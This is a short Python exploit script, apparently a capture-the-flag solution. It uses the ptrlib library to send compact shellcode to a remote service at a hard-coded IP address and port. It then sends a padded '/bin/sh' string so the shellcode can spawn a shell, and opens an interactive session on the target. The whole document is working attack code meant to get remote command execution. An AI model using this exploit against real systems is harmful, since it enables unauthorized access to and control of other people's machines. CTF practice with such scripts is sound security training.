from ptrlib import *

with open("shellcode.o", "rb") as f:
    f.seek(0x180)
    sc = f.read()
    sc = sc[:sc.index(b'EOF')]
    assert len(sc) < 0x14

#sock = Process("./problem")
sock = Socket("114.177.250.4", 2210)

print("len = {}".format(len(sc)))
payload = b'/bin/sh'
payload += b'\x00' * (59 - len(payload))
sock.sendafter(": ", sc)
sock.send(payload)

sock.interactive()
